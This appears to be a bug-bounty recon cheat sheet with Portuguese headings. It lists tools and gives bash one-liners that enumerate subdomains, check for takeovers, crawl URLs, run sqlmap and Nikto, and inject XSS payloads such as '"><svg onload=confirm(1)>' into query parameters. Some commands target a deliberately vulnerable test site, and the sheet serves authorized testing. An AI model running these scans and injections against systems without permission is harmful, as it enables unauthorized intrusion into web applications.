## Ferramentas necessárias

[Subfinder](https://github.com/projectdiscovery/subfinder)<br>
[Sqlmap](https://github.com/sqlmapproject/sqlmap)<br>
[Katana](https://github.com/projectdiscovery/katana)<br>
[Gospider](https://github.com/jaeles-project/gospider)<br>
[Httpx-ToolKit](https://www.kali.org/tools/httpx-toolkit/)<br>
[Qsreplace](https://github.com/tomnomnom/qsreplace)<br>
[Airixss](https://github.com/ferreiraklet/airixss)<br>
[Uro](https://github.com/s0md3v/uro)<br>
[Nuclei](https://github.com/projectdiscovery/nuclei)<br>
[Freq](https://github.com/takshal/freq)<br>
[Hakrawler](https://github.com/hakluke/hakrawler)<br>
[Findomain](https://github.com/Edu4rdSHL/findomain)<br>
[Anew](https://github.com/tomnomnom/anew)<br>
[WayBackUrls](https://github.com/tomnomnom/waybackurls)<br>
[gf](https://github.com/tomnomnom/gf)<br>
[waybackrobots](https://github.com/vodafon/waybackrobots)<br>
[Dalfox](https://github.com/hahwul/dalfox)<br>
[XssTrike](https://github.com/s0md3v/XSStrike)<br>
[Gau](https://github.com/lc/gau)<br>
[Subzy](https://github.com/PentestPad/subzy)<br>
[Whatweb](https://www.kali.org/tools/whatweb/)<br>
[Nikto](https://github.com/sullo/nikto/tree/master)<br>


###  HTTP200. 

```bash
subfinder -d $(cat url) | httpx-toolkit -silent -sc -t 1000 | anew http200;
```

###  WaybackRobots. 

```bash
cat http200 | waybackrobots -d $(cat url) -raw | anew wayROBOTS;
```

###  Sqlmap. 

```bash
findomain -t $(cat url) -q | httpx-toolkit -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1 | anew sqlmap;
```

###  Whatweb. 

```bash
whatweb $(cat url) | anew whatweb;
```


###  Subfinder. 

```bash
subfinder -d $(cat url) -silent -all | httpx-toolkit -silent | anew subfinder;
```

###  SubzyTakeOver. 

```bash
subzy run --targets subfinder | anew subzytakeover;
```


###  Katana crawling. 

```bash
cat subfinder | katana -d 5 -silent | grep -iE '\.js'| grep -iEv '(\.jsp|\.json)' | anew KatanaCrawling1;

cat subfinder | katana -d 5 -silent -em js,jsp,json | anew KatanaCrawling2;
```


###  Dalfox. 

```bash
sudo dalfox url https://testphp.vulnweb.com/listproducts.php?cat=
```


###  Dalfox. 

```bash
cd nikto/program
./nikto.pl -h http://www.example.com
```


###  XssTrike. 

```bash
sudo python3 xsstrike.py -u http://testphp.vulnweb.com/

sudo python3 xsstrike.py -u http://testphp.vulnweb.com/listproducts.php\?cat\=

sudo python3 xsstrike.py -u http://testphp.vulnweb.com/listproducts.php\?cat\= -f payforce.txt
```

###  Gau. 

```bash
gau $(cat url) | grep "\.js" | anew gau
```


###  Gospider. 

```bash
gospider -d 0 -s $(cat url) -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew gospider
```


###  Xss1. 

```bash
echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew xss1;
```



###  Xss2. 

```bash
echo $(cat url) | httpx-toolkit -silent | katana -d 10 -silent | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss2;
```



###  Xss3. 

```bash
echo $(cat url) | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss3;
```


###  Xss4. 

```bash
gau $(cat url) | httpx-toolkit -silent | qsreplace '>XSS<' | freq | grep '>XSS<' | anew xss4;
```


###  OpenRedirect gf. 

```bash
echo $(cat url) | waybackurls | httpx-toolkit -silent -timeout 2 -threads 100 | gf redirect | anew openRedirect
```


###  Nuclei. 

```bash
echo $(cat url) | subfinder -silent | httpx-toolkit -p 80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55440,55672 | nuclei -severity low,medium,high,critical | anew nuclei
```


